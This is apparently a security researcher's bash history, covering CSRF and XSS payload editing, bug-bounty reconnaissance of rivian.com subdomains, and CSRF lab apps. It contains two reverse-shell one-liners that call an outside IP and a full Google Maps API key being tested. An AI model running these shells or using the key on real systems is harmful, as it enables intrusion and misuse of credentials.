+rm 127.0.0.1.html 
+#1746598837
+rm csrfpointer.html 
+#1746598838
+ls -la
+#1746598843
+cat csrf-contenttype.html 
+#1746599077
+exit
+#1746763202
+cd htdocs/lab.hacdex.com/payloads/
+#1746763204
+ls -la
+#1746763211
+cat csrf.html 
+#1746763290
+nano csrf-js.html
+#1746763620
+cat csrf-js.html 
+#1746763994
+nano csrf-js.html
+#1746764014
+cat csrf-js.html 
+#1746764050
+cat csrf.html 
+#1746764088
+cat csrf-contenttype.html 
+#1746764112
+nano csrf-contenttype.html 
+#1746764262
+nano csrf-js.html 
+#1746764322
+cat csrf-js.html 
+#1746765783
+mkdir csrf-brute
+#1746765785
+cd csrf-brute/
+#1746765801
+nano POST-worker.html
+#1746765822
+nano bruter.js
+#1746766133
+nano POST-worker.html 
+#1746767731
+cd ..
+#1746767739
+nano csrf-xss.js 
+#1746768153
+rm csrf-xss.js 
+#1746768155
+nano csrf-xss.js 
+#1746771227
+rm csrf-xss.js 
+#1746771228
+nano csrf-xss.js 
+#1746815133
+ls -la
+#1746815140
+docker container ls
+#1746815895
+docker run -d --name=grafana12 -p 3200:3200 grafana/grafana-enterprise 
+#1746815930
+docker container ls
+#1746815974
+docker container rm 543c49fc2a6f
+#1746815979
+docker container stop 543c49fc2a6f
+#1746815983
+docker container rm 543c49fc2a6f
+#1746816024
+docker run -d --name=grafana12 -p 3200:3000 grafana/grafana-enterprise 
+#1746816028
+docker container ls
+#1746829481
+cd tools/
+#1746829482
+ls
+#1746829487
+git clone https://github.com/danielmiessler/SecLists
+#1746828537
+cd BugBounty/recon/int-rivian/
+#1746828538
+ls -la
+#1746828554
+head gau.filtered 
+#1746828610
+cd ..
+#1746828627
+cp -r int-rivian/ ~/htdocs/lab.hacdex.com/
+#1746828664
+cd ~/htdocs/lab.hacdex.com/int-rivian/
+#1746828665
+ls -la
+#1746828826
+cd reports/
+#1746828827
+ls -la
+#1746828831
+cd http_landing.rivian.com_8443/
+#1746828832
+ls -la
+#1746828836
+cd ../../
+#1746828837
+ls -la
+#1746828854
+cat /opt/automation_scripts/recon.sh 
+#1746828959
+smap -iL resolveddomains.txt -o smap.out
+#1746828968
+smap -iL ./resolveddomains.txt -o smap.out
+#1746829011
+smap -h
+#1746829035
+smap -iL ./resolveddomains.txt -oS smap.out
+#1746829298
+ls
+#1746829403
+/usr/share/secureboot//usr/share/sec
+#1746862500
+dirsearch -u https://my-staging-9d4d1f7g6c.rivian.com/ -w tools/SecLists/Discovery/Web-Content/raft-small-files-lowercase.txt 
+#1746862510
+dirsearch -u https://my-staging-9d4d1f7g6c.rivian.com/ -w tools/SecLists/Discovery/Web-Content/raft-small-files-lowercase.txt -t 5
+#1746949447
+exit
+#1746951107
+cd BugBounty/recon/int-rivian/
+#1746951109
+ls -la
+#1746951129
+rm -rf reports/
+#1746951130
+ls -la
+#1746951140
+cat _roots.txt 
+#1746951223
+cat resolveddomains.txt 
+#1746951228
+ls
+#1746951231
+ls -la
+#1746951272
+cat livewebservers.txt 
+#1746951459
+go install github.com/jaeles-project/gospider@latest
+#1746951560
+cat subdomains_alive.txt 
+#1746951568
+cat assetfinder.out 
+#1746951576
+cat resolveddomains.txt 
+#1746951579
+ls
+#1746951581
+ls -la
+#1746951642
+cat subfinder.out 
+#1746951698
+touch subdomains_combined
+#1746951778
+cat subfinder.out >> subdomains_combined
+#1746951791
+cat subdomains_alive.txt >> subdomains_combined 
+#1746951876
+sed -i 's|https\?://||g' subdomains_combined 
+#1746951883
+nano subdomains_combined \
+#1746951889
+nano subdomains_combined
+#1746951923
+cat subdomains_combined | sort | uniq
+#1746951933
+cat subdomains_combined | sort | uniq > subdomains
+#1746951947
+rm subdomains_combined 
+#1746951949
+ls -la
+#1746951998
+gospider -S subdomains -a -r --js --sitemap --robots -d 30 -c 10 -t 20 -K 10 -q --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico)" | tee spider-output.txt
+#1746952007
+ls -la
+#1746952064
+gospider -h
+#1746952080
+gospider -S subdomains -a -r --js --sitemap --robots -d 30 -c 10 -t 20 -K 10 -q --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico)" | tee spider-output.txt
+#1746952084
+gospider -S subdomains -a -r --js --sitemap --robots -d 30 -c 10 -t 20 -K 10 -q --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico)"
+#1746952093
+gospider -S subdomains -a -r --js --sitemap --robots -d 30 -c 10 -t 20 -K 10 -q
+#1746952098
+gospider -S subdomains -a -r --js --sitemap --robots
+#1746952101
+gospider -S subdomains -a -r --js --sitemap
+#1746952103
+gospider -S subdomains -a -r --j
+#1746952105
+gospider -S subdomains -a -r --js
+#1746952107
+gospider -S subdomains -a -r
+#1746952118
+gospider -S ./subdomains -a -r
+#1746952120
+gospider -S ./subdomains
+#1746952123
+ls -la
+#1746952174
+cat subdomains | gau --threads 50 --blacklist jpg,jpeg,png,gif,svg,css,ttf,woff,woff2,ico,tif,tiff,webp | tee spider-output.txt -a
+#1746952213
+
+#1746952707
+ls -la
+#1746984314
+cd BugBounty/recon/int-rivian/
+#1746984332
+nano output-perms.txt
+#1746977433
+cd BugBounty/recon/
+#1746977434
+ls -la
+#1746977442
+cd int-rivian/
+#1746977444
+ls -la
+#1746977475
+nano spider-output.txt 
+#1746978000
+mv outofscope.txt _outofscope.txt 
+#1746978019
+rm -rf gau.*
+#1746978022
+rm -rf spider-output.txt 
+#1746978028
+rm -rf subfinder.out 
+#1746978038
+rm -rf subdomains_alive.txt 
+#1746978040
+ls
+#1746978045
+rm -rf livewebservers.txt 
+#1746978054
+rm -rf resolveddomains.txt 
+#1746978056
+ls -la
+#1746978063
+rm -rf subdomains 
+#1746978096
+ls -la
+#1746978105
+rm -rf assetfinder.out 
+#1746978119
+ls -la
+#1746978207
+cd ..
+#1746978213
+ls -la
+#1746978225
+mv h1-* .ignoredirs/
+#1746978227
+ls -la
+#1746978247
+mv int-* .ignoredirs/
+#1746978289
+mv .ignoredirs/int-rivian/ .
+#1746978291
+ls -la
+#1746978303
+cd int-rivian/
+#1746978612
+cat *
+#1746978616
+ls -la
+#1746978630
+cat _domains.txt 
+#1746978636
+cat _roots.txt 
+#1746998244
+cd tools/
+#1746998256
+git clone https://github.com/Fricciolosa-Red-Team/GoogleMapsApiScanner.git
+#1746998259
+cd GoogleMapsApiScanner/
+#1746998278
+python3 gmaps.py -a "AIzaSyBURsG1tEnusw1U7s-R0G8p1-5mHb7vviE"
+#1746998322
+git clone https://github.com/joanbono/gap
+#1746998325
+cd gap/
+#1746998329
+go install .
+#1746998367
+go run *.go -api "AIzaSyBURsG1tEnusw1U7s-R0G8p1-5mHb7vviE" -poc
+#1747175811
+docker exec -u root -it 82672cee2597 /bin/bash
+#1747282257
+cd htdocs/lab.hacdex.com/payloads/
+#1747282259
+ls -la
+#1747282269
+gedit csrf-xss.js 
+#1747282275
+nano csrf-xss.js 
+#1747283500
+cat csrf-contenttype.html 
+#1747284122
+nano csrf-2-2.html
+#1747284373
+rm csrf-2-2.html
+#1747284374
+nano csrf-2-2.html
+#1747287740
+nano csrf-3-4.html
+#1747287891
+rm csrf-3-4.html
+#1747287893
+nano csrf-3-4.html
+#1747290013
+ls -la
+#1747290018
+nano csrf.html 
+#1747370187
+cat .ssh/authorized_keys 
+#1747370237
+mkdir flasky
+#1747370240
+cd flasky/
+#1747370241
+ls -la
+#1747370338
+git clone https://github.com/dexter-11/flasky
+#1747370352
+cd flasky/CSRF3.2_doublesubmitcookie-viaPOSTparam-strongtoken-NoXSS/
+#1747370353
+ls- la
+#1747370357
+ls -la
+#1747370364
+nano app.py 
+#1747370413
+python3 app.py 
+#1747370421
+apt install python3-flask
+#1747370426
+sudo apt install python3-flask
+#1747370444
+python3 app.py 
+#1747370467
+nano app.py 
+#1747370729
+python3 app.py 
+#1747370903
+sudo systemctl status nginx.service 
+#1747370913
+sudo systemctl stop nginx.service 
+#1747370915
+sudo systemctl status nginx.service 
+#1747370930
+python3 app.py 
+#1747370956
+ls -la
+#1747370960
+cd flasky/
+#1747370968
+ls -la
+#1747370972
+cd flasky/
+#1747370979
+cd CSRF3.2_doublesubmitcookie-viaPOSTparam-strongtoken-NoXSS/
+#1747370984
+python3 app.py 
+#1747370990
+sudo python3 app.py 
+#1747371024
+nano app.py 
+#1747371056
+sudo python3 app.py 
+#1747372435
+cd ../CSRF3.1_doublesubmitcookie-viaPOSTparam-strongtoken-withXSS/
+#1747372440
+nano app.py 
+#1747372480
+tail ../CSRF3.2_doublesubmitcookie-viaPOSTparam-strongtoken-NoXSS/app.py 
+#1747372491
+nano app.py 
+#1747372516
+sudo python3 app.py 
+#1747376689
+nano app.py 
+#1747376713
+sudo python3 app.py 
+#1747376751
+pip install flask_cors
+#1747376782
+sudo apt install python3-flask_cors
+#1747376967
+nano app.py 
+#1747376987
+sudo python3 app.py 
+#1747398286
+ls -la
+#1747398294
+ls
+#1747398304
+cd htdocs/
+#1747398305
+ls -la
+#1747398308
+cd lab.hacdex.com/
+#1747398310
+ls -la
+#1747398314
+cd ../../
+#1747398315
+ls -la
+#1747398317
+cd flasky/
+#1747398318
+ls -la
+#1747398344
+ls /etc/nginx/
+#1747398348
+sudo ls /etc/nginx/
+#1747398362
+sudo su
+#1747399004
+cd
+#1747399008
+cd htdocs/lab.hacdex.com/
+#1747399010
+ls -la
+#1747404316
+netstat -antp
+#1747404334
+ls -la
+#1747404338
+cd
+#1747404340
+cd flasky/
+#1747404341
+ls -la
+#1747404344
+cd flasky/
+#1747404345
+ls -la
+#1747404353
+git fetch
+#1747404357
+git pull
+#1747404360
+git fetch
+#1747404366
+cd ..
+#1747404370
+rm -rf flasky/
+#1747404372
+cd ..
+#1747404375
+rm -rf flasky/
+#1747404396
+git clone https://github.com/dexter-11/flasky
+#1747404399
+dc flasky/
+#1747404400
+ls -la
+#1747404406
+cd flasky/
+#1747404407
+ls -la
+#1747404412
+cd CSRF3.6_doublesubmitcookie-viaPOSTparam-strongtoken-noXSS-subdomainexploit/
+#1747404413
+ls -la
+#1747404417
+nano app.py 
+#1747404498
+python3 app.py 
+#1747404512
+ls -la
+#1747404514
+python3 app.py 
+#1747404520
+nano app.py 
+#1747404600
+python3 app.py 
+#1747404608
+sudo python3 app.py 
+#1747404610
+nano app.py 
+#1747404966
+cd
+#1747404971
+cat /etc/hosts
+#1747405000
+ls -la /etc/nginx/
+#1747405003
+sudo ls -la /etc/nginx/
+#1747405008
+sudo su
+#1747413923
+sudo nginx -t
+#1747413934
+sudo systemctl reload nginx.service 
+#1747414022
+sudo su
+#1747414413
+ls -la
+#1747417698
+sudo su
+#1747480020
+exit
+#1747480055
+sudo ps aux
+#1747480079
+docker ls
+#1747480083
+docker container ls
+#1747480249
+docker container rm 71bc4c8d0f0a
+#1747480254
+docker container stop 71bc4c8d0f0a
+#1747480266
+docker container rm 71bc4c8d0f0a
+#1747484578
+nc -e /bin/bash 159.65.159.81 4445
+#1747484662
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 159.65.159.81 4445 >/tmp/f
+#1747484708
+ps aux
+#1747484732
+ps aux | grep nc
+#1747484739
+ps aux | grep mkfifo
+#1747487243
+clear
+#1747487484
+ls
+#1747487490
+ls htdocs/
+#1747487499
+cd htdocs/
+#1747487538
+sudo cp /home/hacdex-profile/htdocs/* .
+#1747487547
+sudo cp -r /home/hacdex-profile/htdocs/* .
+#1747487584
+sudo cp -r /home/hacdex-profile/htdocs .
+#1747487598
+ls -la
+#1747487607
+mv htdocs/* .
+#1747487612
+sudo mv htdocs/* .
+#1747487616
+ls
+#1747487637
+sudo cp htdocs/* .
+#1747487641
+ls
+#1747487646
+ls -la
+#1747487648
+cd htdocs/
+#1747487670
+sudo chown lab:lab htdocs/
+#1747487676
+sudo cp -r htdocs/* .
+#1747487689
+ls -la
+#1747487698
+rm -rf htdocs/
+#1747487714
+sudo rm -rf htdocs/
+#1747487717
+ls -la
+#1747487727
+sudo chown lab:lab profile*
+#1747487731
+sudo chown -R lab:lab profile*
+#1747487735
+chown -h
+#1747487738
+chown --help
+#1747487743
+ls -la
+#1747487931
+sudo cp -r profile.hacdex.com/ /home/hacdex-profile/htdocs/
+#1747487991
+sudo rm -rf /home/hacdex-profile/htdocs/profile.hacdex.com/*
+#1747488097
+sudo chown -R hacdex-profile:hacdex-profile /home/hacdex-profile/htdocs/profile.hacdex.com
+#1747588537
+docker containers ls
+#1747588539
+docker container ls
+#1748041428
+cd htdocs/lab.hacdex.com/payloads/
+#1748041434
+gedit xss-js.html
+#1748041442
+nano xss-js.html
+#1748042626
+rm xss-js.html 
+#1748042627
+nano xss-js.html
+#1748186435
+id
+#1748410471
+curl https://attacker.hacdex.com:5000/
+#1748410483
+curl https://127.0.0.1:5000/
+#1748410486
+curl https://127.0.0.1:5000/ -k
+#1748410503
+curl https://152.42.158.189:5000/ -k
+#1748410537
+curl https://142.93.220.40:5000/ -k
+#1748411310
+curl https://152.42.158.189:5000/ -k
+#1748411486
+exit
+#1748407844
+ls -la
+#1748407845
+ls
+#1748407857
+ls flasky/
+#1748407858
+ls -la
+#1748407864
+cd flasky/
+#1748407867
+git pull
+#1748407871
+git fetch
+#1748407910
+cd CSRF3.6_doublesubmitcookie-viaPOSTparam-strongtoken-noXSS-subdomainexploit/
+#1748407911
+ls -la
+#1748408222
+ping greshell.ddns.net
+#1748408229
+ping https://greshell.ddns.net
+#1748408409
+cd support-app/
+#1748408418
+python3 app.py 
+#1748408803
+cd support-app/
+#1748408807
+python3 app.py 
+#1748409000
+gedit app.py 
+#1748409013
+nano app.py
+#1748409028
+python3 app.py 
+#1748409116
+nano app.py
+#1748409137
+python3 app.py 
+#1748409141
+sudo python3 app.py 
+#1748409144
+python3 app.py 
+#1748409152
+nano app.py
+#1748409165
+python3 app.py 
+#1748409219
+nano app.py
+#1748409229
+python3 app.py 
+#1748409233
+nano app.py
+#1748409411
+python3 app.py 
+#1748409827
+nano app.py
+#1748409863
+python3 app.py 
+#1748410035
+nano app.py
+#1748410071
+python3 app.py 
+#1748410195
+nano app.py
+#1748410217
+python3 app.py 
+#1748410228
+sudo python3 app.py 
+#1748410245
+nano app.py
+#1748410389
+python3 app.py 
+#1748411362
+nano app.py
+#1748411446
+python3 app.py 
+#1748411584
+python3 -m http.server 9000
+#1748411652
+cat /etc/hosts
+#1748411714
+python3 -m http.server 9000
